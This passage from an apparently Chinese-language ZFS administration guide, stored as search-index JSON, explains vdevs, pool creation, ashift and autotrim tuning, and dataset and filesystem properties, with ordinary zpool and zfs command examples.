\u200b\u5bf9\u200b\u201c\u200b\u786c\u76d8\u200b\u7ec4\u200b\u201d\u200b\u7684\u200b\u62bd\u8c61\u200b\u3002\u200b\u4e00\u4e2a\u200b vdev \u200b\u53ef\u4ee5\u200b\u662f\u200b\u5355\u5757\u200b\u786c\u76d8\u200b\u3001mirror\uff08\u200b\u7c7b\u4f3c\u200b RAID 1 \u200b\u786c\u76d8\u200b\u7ec4\u200b\uff09\u200b\u6216\u200b RAID-Z\u3001RAID-Z2\u3001RAID-Z3\uff08\u200b\u7c7b\u4f3c\u200b RAID 5\u30016\u30017 \u200b\u786c\u76d8\u200b\u7ec4\u200b\uff09\u200b\u7b49\u200b\u3002</li> <li>pool \u200b\u662f\u200b ZFS \u200b\u7684\u200b\u5b58\u50a8\u200b\u6c60\u200b\uff0c\u200b\u7531\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b vdev \u200b\u7ec4\u6210\u200b\uff0c\u200b\u7c7b\u4f3c\u200b LVM \u200b\u7684\u200b VG\uff08Volume Group\uff09\u200b\u6982\u5ff5\u200b\u3002</li> <li> <p>ZFS \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u548c\u200b Zvol\uff08ZFS Volume\uff09\u200b\u90fd\u200b\u662f\u200b\u5728\u200b pool \u200b\u4e0a\u200b\u521b\u5efa\u200b\u7684\u200b\uff0c\u200b\u7c7b\u4f3c\u200b LVM \u200b\u7684\u200b LV\uff08Logical Volume\uff09\u200b\u6982\u5ff5\u200b\u3002</p> <p>\u200b\u4e0e\u200b LVM \u200b\u7565\u6709\u200b\u533a\u522b\u200b\u7684\u200b\u5730\u65b9\u200b\u662f\u200b\uff0cZFS \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u662f\u200b\u76f4\u63a5\u200b\u521b\u5efa\u200b\u5728\u200b pool \u200b\u4e0a\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u50cf\u200b LVM \u200b\u4e00\u6837\u200b\u5148\u200b\u521b\u5efa\u200b LV\uff0c\u200b\u518d\u200b\u5c06\u200b\u5176\u200b\u683c\u5f0f\u5316\u200b\u4e3a\u200b\u67d0\u79cd\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002ZFS \u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5c31\u662f\u200b ZFS\u3002</p> </li> </ul>"},{"location":"ops/storage/zfs/#zpool","title":"ZFS pool","text":""},{"location":"ops/storage/zfs/#create-pool","title":"\u521b\u5efa\u200b pool","text":"<p>\u200b\u540c\u6837\u200b\u4e0e\u200b LVM \u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0cZFS \u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b\u6574\u5757\u200b\u786c\u76d8\u200b\u6216\u200b\u5c3d\u53ef\u80fd\u200b\u6574\u5757\u200b\u7684\u200b\u786c\u76d8\u200b\u6765\u200b\u521b\u5efa\u200b pool\uff0c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b\u7a33\u5b9a\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u4f5c\u4e3a\u200b\u4e00\u9879\u200b\u9002\u914d\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5982\u679c\u200b\u5c06\u200b\u6574\u5757\u200b\u786c\u76d8\u200b\u7528\u4e8e\u200b\u521b\u5efa\u200b zpool\uff0cZFS \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5bf9\u200b\u5176\u200b\u8fdb\u884c\u200b\u5206\u533a\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u786c\u76d8\u200b\u6545\u969c\u200b\u65f6\u200b\u80fd\u591f\u200b\u66f4\u597d\u200b\u5730\u200b\u8bc6\u522b\u200b\u548c\u200b\u5904\u7406\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5047\u8bbe\u200b disk[1-3].img \u200b\u662f\u200b\u4e09\u5757\u200b\u5927\u5c0f\u200b\u76f8\u540c\u200b\u7684\u200b\u786c\u76d8\u200b\u3002</p> <pre><code>$ truncate -s 1G disk1.img disk2.img disk3.img\n$ sudo losetup -f --show disk1.img\n/dev/loop0\n$ sudo losetup -f --show disk2.img\n/dev/loop1\n$ sudo losetup -f --show disk3.img\n/dev/loop2\n$ sudo zpool create tank /dev/loop0 /dev/loop1 /dev/loop2\n$\n</code></pre> <p>\u200b\u5173\u4e8e\u200b zpool</p> <p><code>ashift</code> \u200b\u53c2\u6570\u200b\u662f\u200b ZFS \u200b\u5bf9\u200b\u201c\u200b\u78c1\u76d8\u200b\u6247\u533a\u200b\u5927\u5c0f\u200b\u201d\u200b\u7684\u200b\u7406\u89e3\u200b\uff0c\u200b\u4e14\u200b\u5728\u200b\u521b\u5efa\u200b pool \u200b\u540e\u200b\u65e0\u6cd5\u200b\u66f4\u6539\u200b\u3002 \u200b\u4e3a\u4e86\u200b\u786e\u4fdd\u200b\u6700\u4f73\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c<code>ashift</code> \u200b\u53c2\u6570\u200b\u5e94\u5f53\u200b\u4e0e\u200b\u786c\u76d8\u200b\u7684\u200b\u771f\u5b9e\u200b\u6247\u533a\u200b\u5927\u5c0f\u200b\u76f8\u5339\u914d\u200b\uff0c\u200b\u65e2\u200b\u4e0d\u5b9c\u200b\u8fc7\u5927\u200b\u4e5f\u200b\u4e0d\u5b9c\u200b\u8fc7\u200b\u5c0f\u200b\u3002 \u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5728\u200b\u521b\u5efa\u200b zpool \u200b\u7684\u200b\u65f6\u5019\u200b\uff0cZFS \u200b\u4f1a\u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u786c\u76d8\u200b\u7684\u200b\u6247\u533a\u200b\u5927\u5c0f\u200b\uff08<code>ioctl(BLKPBSZGET)</code>\uff09\u200b\u5e76\u200b\u8bbe\u7f6e\u200b\u5408\u9002\u200b\u7684\u200b <code>ashift</code> \u200b\u53c2\u6570\u200b\u3002 \u200b\u5bf9\u4e8e\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff0c\u200b\u5efa\u8bae\u200b\u67e5\u9605\u200b\u786c\u76d8\u200b\u7684\u200b\u89c4\u683c\u200b\uff0c\u200b\u7136\u540e\u200b\u624b\u52a8\u200b\u6307\u5b9a\u200b <code>zpool create -o ashift=...</code>\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u4e0d\u200b\u786e\u5b9a\u200b\u786c\u76d8\u200b\u7684\u200b\u7269\u7406\u200b\u6247\u533a\u200b\u5927\u5c0f\u200b\uff08\u200b\u5c24\u5176\u200b\u662f\u200b\u5bf9\u4e8e\u200b\u6d88\u8d39\u200b\u7ea7\u200b\u56fa\u6001\u200b\u786c\u76d8\u200b\uff09\uff0c\u200b\u4f7f\u7528\u200b 4K\uff08<code>ashift=12</code>\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u4fdd\u5b88\u200b\u4f46\u200b\u5408\u7406\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u5728\u200b\u751f\u4ea7\u200b\u73af\u5883\u200b\u4e2d\u200b\uff0c\u200b\u8bf7\u200b\u4e0d\u8981\u200b\u5c06\u200b ZFS \u200b\u7528\u4e8e\u200b\u4efb\u4f55\u200b\u865a\u62df\u200b\u786c\u76d8\u200b\u6216\u200b\u8f6f\u4ef6\u200b/\u200b\u786c\u4ef6\u200b RAID \u200b\u9635\u5217\u200b\u4e0a\u200b\u3002 \u200b\u53ea\u6709\u200b\u5f53\u200b ZFS \u200b\u76f4\u63a5\u200b\u7ba1\u7406\u200b\u6bcf\u5757\u200b\u786c\u76d8\u200b\u65f6\u200b\uff0c\u200b\u624d\u80fd\u200b\u83b7\u5f97\u6700\u4f73\u200b\u7684\u200b\u6027\u80fd\u200b\u548c\u200b ZFS \u200b\u63d0\u4f9b\u200b\u7684\u200b\u6570\u636e\u5b8c\u6574\u6027\u200b\u4fdd\u8bc1\u200b\u3002 \u200b\u5982\u679c\u200b\u4f60\u200b\u7684\u200b\u9635\u5217\u5361\u200b\u4e0d\u200b\u652f\u6301\u200b\u76f4\u901a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u4e3a\u200b\u6bcf\u5757\u200b\u76d8\u200b\u5efa\u7acb\u200b\u4e00\u4e2a\u200b\u5355\u76d8\u200b\u9635\u5217\u200b\u4ee5\u200b\u6700\u5c0f\u5316\u200b\u9635\u5217\u5361\u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p> <p>\u200b\u5728\u200b\u5b9e\u9645\u200b\u5e94\u7528\u200b\u4e2d\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b <code>sda</code>\u3001<code>nvme0n1</code> \u200b\u7b49\u200b\u8bbe\u5907\u200b\u540d\u6765\u200b\u521b\u5efa\u200b pool\uff0cZFS \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5bf9\u200b\u5176\u200b\u8fdb\u884c\u200b\u5206\u533a\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>sda1</code>\u3001<code>nvme0n1p1</code> \u200b\u7b49\u200b\u5206\u533a\u200b\u540d\u6765\u200b\u521b\u5efa\u200b pool\uff0c\u200b\u5e76\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u76d8\u200b\u7684\u200b\u672b\u5c3e\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b 8 MB \u200b\u7684\u200b\u5206\u533a\u200b\uff08<code>sda9</code>\u3001<code>nvme0n1p9</code>\uff09\u3002\u200b\u5206\u533a\u200b\u7684\u200b\u76ee\u7684\u200b\u53ef\u80fd\u200b\u51fa\u4e8e\u200b\u67d0\u4e9b\u200b\u5386\u53f2\u200b\u539f\u56e0\u200b\uff0c\u200b\u76ee\u524d\u200b\u65e0\u4ece\u200b\u8003\u8bc1\u200b\uff0c\u200b\u4e14\u200b\u8fd9\u4e2a\u200b\u7f16\u53f7\u200b\u4e3a\u200b 9 \u200b\u7684\u200b\u5206\u533a\u200b\u662f\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u7528\u9014\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e0d\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b\u5757\u200b\u8bbe\u5907\u200b\u540d\u200b\u521b\u5efa\u200b zpool</p> <p>\u200b\u5757\u200b\u8bbe\u5907\u200b\u540d\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u4e0d\u662f\u200b\u7a33\u5b9a\u200b\u7684\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u5b58\u5728\u200b\u591a\u5757\u200b\u786c\u76d8\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u5728\u200b\u6bcf\u6b21\u200b\u91cd\u542f\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5757\u200b\u8bbe\u5907\u200b\u540d\u200b\u65e0\u6cd5\u200b\u4fdd\u8bc1\u200b\u4e0d\u53d8\u200b\u3002\u200b\u8fd9\u4f1a\u200b\u5bfc\u81f4\u200b ZFS \u200b\u65e0\u6cd5\u200b\u6b63\u786e\u200b\u8bc6\u522b\u200b zpool \u200b\u4e2d\u200b\u7684\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8ba4\u4e3a\u200b\u6240\u6709\u200b\u5bf9\u5e94\u200b\u7684\u200b\u8bbe\u5907\u200b\u90fd\u200b\u5df2\u7ecf\u200b\u6389\u7ebf\u200b\uff0c\u200b\u5bfc\u81f4\u200b pool \u200b\u8fdb\u5165\u200b\u964d\u7ea7\u200b\u6216\u200b\u4e0d\u53ef\u200b\u7528\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b <code>/dev/disk</code> \u200b\u6765\u200b\u521b\u5efa\u200b zpool\u3002\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u521b\u5efa\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5148\u200b export\uff08\u200b\u53d6\u6d88\u200b\u6302\u8f7d\u200b\uff09\u200b\u4e4b\u540e\u200b\u518d\u200b import\uff1a</p> <pre><code>zpool export tank\nzpool import tank -d /dev/disk/by-id\n</code></pre> <p>\u200b\u5728\u200b\u521b\u5efa\u200b\u597d\u200b pool \u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>zpool status</code> \u200b\u548c\u200b <code>zpool list</code> \u200b\u67e5\u770b\u200b pool \u200b\u7684\u200b\u72b6\u6001\u200b\u548c\u200b\u4f7f\u7528\u200b\u60c5\u51b5\u200b\u3002</p> <pre><code>$ zpool status\n  pool: tank\n state: ONLINE\nconfig:\n\n        NAME        STATE     READ WRITE CKSUM\n        tank        ONLINE       0     0     0\n          loop0     ONLINE       0     0     0\n          loop1     ONLINE       0     0     0\n          loop2     ONLINE       0     0     0\n\nerrors: No known data errors\n$ zpool list\nNAME    SIZE  ALLOC   FREE  CKPOINT  EXPANDSZ   FRAG    CAP  DEDUP    HEALTH  ALTROOT\ntank   2.81G   112K  2.81G        -         -     0%     0%  1.00x    ONLINE  -\n</code></pre> <p>Tip</p> <p>\u200b\u5728\u200b ZFS \u200b\u4e2d\u200b\uff0c\u200b\u7edd\u5927\u591a\u6570\u200b\u8bf8\u5982\u200b\u67e5\u8be2\u200b\u72b6\u6001\u200b\u7b49\u200b\u53ea\u8bfb\u200b\u7684\u200b\u547d\u4ee4\u200b\u90fd\u200b\u4e0d\u200b\u9700\u8981\u200b <code>sudo</code>\u3002</p> <p>\u200b\u5728\u200b\u521b\u5efa\u200b\u597d\u200b zpool <code>tank</code> \u200b\u540e\u200b\uff0cZFS \u200b\u4e5f\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b <code>tank</code> \u200b\u5e76\u200b\u6302\u8f7d\u200b\u5728\u200b\u4e86\u200b <code>/tank</code> \u200b\u76ee\u5f55\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\uff0c\u200b\u4f46\u200b\u6211\u4eec\u200b\u5f3a\u70c8\u63a8\u8350\u200b\u6309\u7167\u200b ZFS \u200b\u6570\u636e\u200b\u96c6\u200b\u4e00\u8282\u200b\u521b\u5efa\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6216\u200b Zvol \u200b\u518d\u200b\u5728\u200b\u5176\u4e2d\u200b\u5b58\u50a8\u200b\u8d44\u6599\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u65b0\u5efa\u200b\u7684\u200b ZFS pool\uff0c\u200b\u6211\u4eec\u200b\u63a8\u8350\u200b\u8c03\u6574\u200b\u4e00\u4e9b\u200b\u53c2\u6570\u200b\u4ee5\u200b\u83b7\u5f97\u6700\u4f73\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5177\u4f53\u200b\u53c2\u89c1\u200b\u4e0b\u200b\u4e00\u8282\u200b\u3002</p>"},{"location":"ops/storage/zfs/#tuning-zpool","title":"\u53c2\u6570\u200b\u8c03\u8282","text":"<p>zpool \u200b\u5c42\u9762\u200b\u7684\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>zpool set</code> \u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b\u8c03\u6574\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u63a8\u8350\u200b\u4fee\u6539\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li> <p><code>ashift</code>\uff1a\u200b\u8be6\u89c1\u200b\u4e0a\u9762\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002\u200b\u6ce8\u610f\u200b <code>ashift</code> \u200b\u53c2\u6570\u200b\u5728\u200b\u521b\u5efa\u200b pool \u200b\u540e\u200b\u65e0\u6cd5\u200b\u66f4\u6539\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8bf7\u200b\u5728\u200b\u521b\u5efa\u200b pool \u200b\u65f6\u200b\u6307\u5b9a\u200b\uff08\u200b\u6216\u8005\u200b\u91c7\u7528\u200b ZFS \u200b\u81ea\u52a8\u68c0\u6d4b\u200b\u5230\u200b\u7684\u200b\u5408\u9002\u200b\u503c\u200b\uff0c\u200b\u89c1\u200b\u4e0a\u200b\uff09\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>zpool create -o ashift=12 tank /dev/loop0 /dev/loop1 /dev/loop2\n</code></pre> </li> <li> <p><code>autotrim=on</code>\uff1a\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b\u786c\u76d8\u200b\u662f\u200b SSD\uff0c\u200b\u542f\u7528\u200b\u6b64\u200b\u9009\u9879\u200b\u540e\u200b ZFS \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u4e3a\u200b\u5df2\u200b\u5220\u9664\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\u5411\u200b\u786c\u76d8\u200b\u53d1\u9001\u200b TRIM \u200b\u6307\u4ee4\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>zpool set autotrim=on tank\n</code></pre> </li> </ul> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5728\u200b\u7279\u5b9a\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6709\u7528\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li><code>bootfs=pool0/ROOT/debian</code>\uff1a\u200b\u5982\u679c\u200b\u4f60\u200b\u4f7f\u7528\u200b root on ZFS\uff0c\u200b\u8be5\u200b\u53c2\u6570\u200b\u662f\u200b\u5e38\u89c1\u200b\u7684\u200b grub \u200b\u914d\u7f6e\u200b\u53ca\u200b initramfs \u200b\u751f\u6210\u200b\u811a\u672c\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u53c2\u6570\u200b\u3002</li> </ul>"},{"location":"ops/storage/zfs/#dataset","title":"ZFS \u200b\u6570\u636e\u200b\u96c6\u200b\uff08dataset\uff09","text":"<p>\u200b\u5728\u200b ZFS \u200b\u4e2d\u200b\uff0c\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\u7684\u200b\u3001\u200b\u4e0e\u200b\u201c\u200b\u5377\u200b\u201d\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u5355\u4f4d\u200b\u662f\u200b\u6570\u636e\u200b\u96c6\u200b\uff08dataset\uff09\u3002ZFS dataset \u200b\u4e3b\u8981\u200b\u6709\u200b\u4e24\u79cd\u200b\u5f62\u5f0f\u200b\uff1a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08filesystem\uff09\u200b\u6216\u200b zvol<sup>2</sup>\u3002</p> <p>ZFS dataset \u200b\u5c42\u9762\u200b\u7684\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>zfs set</code> \u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b\u8c03\u6574\u200b\uff0c\u200b\u8bed\u6cd5\u200b\u4e0e\u200b <code>zpool set</code> \u200b\u7c7b\u4f3c\u200b\u3002</p>"},{"location":"ops/storage/zfs/#zfs-filesystem","title":"ZFS \u200b\u6587\u4ef6\u7cfb\u7edf","text":"<p>ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff08filesystem\uff09\u200b\u662f\u200b ZFS \u200b\u7684\u200b\u4e3b\u8981\u200b\u5b58\u50a8\u200b\u5f62\u5f0f\u200b\uff0c\u200b\u901a\u8fc7\u200b VFS \u200b\u63a5\u53e3\u200b\u63d0\u4f9b\u200b\u6587\u4ef6\u200b\u5b58\u50a8\u200b\u529f\u80fd\u200b\u3002\u200b\u5f53\u200b\u4f60\u200b\u521b\u5efa\u200b ZFS pool <code>tank</code> \u200b\u65f6\u200b\uff0c\u200b\u8fd9\u4e2a\u200b pool \u200b\u7684\u200b\u6839\u200b\u6570\u636e\u200b\u96c6\u200b\uff08root dataset\uff09\u200b\u5c31\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u6210\u4e3a\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5e76\u200b\u6302\u8f7d\u200b\u5728\u200b <code>/tank</code> \u200b\u76ee\u5f55\u200b\u4e0b\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fbf\u4e8e\u7ba1\u7406\u200b\u548c\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u6211\u4eec\u200b\u5f3a\u70c8\u63a8\u8350\u200b\u5efa\u7acb\u200b\u989d\u5916\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6765\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u5728\u200b <code>/tank</code> \u200b\u4e0b\u200b\u5b58\u50a8\u200b\u6570\u636e\u200b\u3002\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>zfs create tank/data\nzfs create tank/backup\n# etc.\n</code></pre> <p>\u200b\u8fd9\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u7ee7\u627f\u200b\u4e0a\u7ea7\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5c5e\u6027\u200b\uff08\u200b\u5982\u200b\u538b\u7f29\u200b\u3001\u200b\u5feb\u7167\u200b\u7b49\u200b\uff09\u3002\u200b\u7279\u522b\u200b\u5730\u200b\uff0c<code>mountpoint</code> \u200b\u5c5e\u6027\u200b\u7684\u200b\u7ee7\u627f\u200b\u65b9\u5f0f\u200b\u662f\u200b\u5728\u200b\u4e0a\u7ea7\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b <code>mountpoint</code> \u200b\u5c5e\u6027\u200b\u4e0a\u200b\u52a0\u4e0a\u200b\u5f53\u524d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u540d\u79f0\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>/tank/data</code> \u200b\u7684\u200b\u9ed8\u8ba4\u200b\u6302\u8f7d\u200b\u70b9\u4e3a\u200b <code>/tank/data</code> \u200b\u7b49\u200b\u3002ZFS \u200b\u7684\u200b\u5c5e\u6027\u200b\u7ee7\u627f\u200b\u529f\u80fd\u200b\u662f\u200b\u6211\u4eec\u200b\u975e\u5e38\u200b\u63a8\u8350\u200b\u7684\u200b\u201c\u200b\u4fbf\u4e8e\u7ba1\u7406\u200b\u548c\u200b\u7ef4\u62a4\u200b\u201d\u200b\u7684\u200b\u7279\u6027\u200b\u4e4b\u4e00\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4e2d\u79d1\u5927\u200b\u955c\u50cf\u200b\u7ad9\u200b\u5c31\u200b\u5c06\u200b\u8f6f\u4ef6\u200b\u4ed3\u5e93\u200b\u653e\u5728\u200b <code>pool0/repo</code> \u200b\u4e0b\u200b\uff0c\u200b\u8be5\u200b\u76ee\u5f55\u200b\u7684\u200b <code>mountpoint</code> \u200b\u5c5e\u6027\u200b\u4e3a\u200b <code>/srv/repo</code>\uff0c\u200b\u6b64\u65f6\u200b\u6bcf\u4e2a\u200b\u5177\u4f53\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u4ed3\u5e93\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5efa\u7acb\u200b\u72ec\u7acb\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5e76\u200b\u7ee7\u627f\u200b\u6240\u6709\u200b\u91cd\u8981\u200b\u5c5e\u6027\u200b\uff0c\u200b\u5982\u200b <code>pool0/repo/ubuntu</code> \u200b\u7684\u200b\u6302\u8f7d\u200b\u70b9\u200b\u5c31\u200b\u81ea\u52a8\u200b\u7ee7\u627f\u200b\u4e3a\u200b <code>/srv/repo/ubuntu</code>\u3002</p> <p>ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u72ec\u7acb\u6027\u200b</p> <p>ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5c42\u6b21\u7ed3\u6784\u200b\u4ec5\u200b\u7528\u4e8e\u200b\u7ba1\u7406\u200b\u548c\u200b\u7ef4\u62a4\u200b\uff08\u200b\u7ee7\u627f\u200b\u53c2\u6570\u200b\u548c\u200b\u5c5e\u6027\u200b\uff0c\u200b\u521b\u5efa\u200b\u3001\u200b\u56de\u6eda\u200b\u548c\u200b\u53d1\u9001\u200b\u5feb\u7167\u200b\uff0c\u200b\u4ee5\u53ca\u200b destroy \u200b\u7b49\u200b\uff09\uff0c\u200b\u4e0d\u540c\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5185\u200b\u5b58\u50a8\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u5b8c\u5168\u200b\u72ec\u7acb\u200b\u7684\u200b\u3002\u200b\u56e0\u6b64\u200b\u5373\u4f7f\u200b\u662f\u200b\u5177\u6709\u200b\u7236\u5b50\u5173\u7cfb\u200b\u7684\u200b\u4e24\u4e2a\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5176\u200b\u5185\u5bb9\u200b\u4e5f\u200b\u4e0d\u80fd\u200b\u76f4\u63a5\u200b\u5408\u5e76\u200b\uff0c\u200b\u5fc5\u987b\u200b\u5c06\u5b50\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5185\u5bb9\u200b\u590d\u5236\u5230\u200b\u7236\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u518d\u200b <code>zfs destroy</code> \u200b\u5b50\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/storage/zfs/#zfs-filesystem-props","title":"ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u53c2\u6570","text":"<p>ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>zfs set</code> \u200b\u547d\u4ee4\u200b\u8fdb\u884c\u200b\u8c03\u6574\u200b\uff0c\u200b\u6216\u8005\u200b\u5728\u200b\u521b\u5efa\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u65f6\u200b\u901a\u8fc7\u200b <code>-o</code> \u200b\u6307\u5b9a\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>zfs create -o xattr=sa -o compression=zstd tank/dat\n# OR\nzfs create tank/data\nzfs set xattr=sa compression=zstd tank/data\n</code></pre> <p>\u200b\u6ce8\u610f\u200b ZFS \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u5927\u90e8\u5206\u200b\u53c2\u6570\u200b\u4e0d\u4f1a\u200b\u5f71\u54cd\u200b\u5df2\u6709\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u53ea\u200b\u5bf9\u200b\u65b0\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\u751f\u6548\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u5bf9\u4e8e\u200b <code>compression</code> \u200b\u5c24\u5176\u200b\u91cd\u8981\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u63a8\u8350\u200b/\u200b\u7ecf\u5e38\u200b\u4fee\u6539\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ul> <li> <p><code>xattr=sa</code>\uff1a\u200b\u5c06\u200b\u6587\u4ef6\u200b\u7684\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\uff08\u200b\u5982\u200b POSIX ACL \u200b\u548c\u200b SELinux \u200b\u6807\u7b7e\u200b\u7b49\u200b\uff09\u200b\u5b58\u50a8\u200b\u5728\u200b dnode \u200b\u4e2d\u200b\uff08\u200b\u7c7b\u4f3c\u200b\u5176\u4ed6\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b inode\uff09\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u72ec\u7acb\u200b\u7684\u200b\u201c\u200b\u6587\u4ef6\u200b\u201d\u200b\u4e2d\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u7ecf\u5e38\u200b\u4f7f\u7528\u200b\u6269\u5c55\u200b\u5c5e\u6027\u200b\u7684\u200b\u5e94\u7528\u200b\u573a\u666f\u200b\uff08\u200b\u5982\u200b Samba\uff09\uff0c\u200b\u4f7f\u7528\u200b <code>xattr=sa</code> \u200b\u53ef\u4ee5\u200b\u51cf\u5c11\u200b\u78c1\u76d8\u200b I/O\uff0c\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\u3002</p> 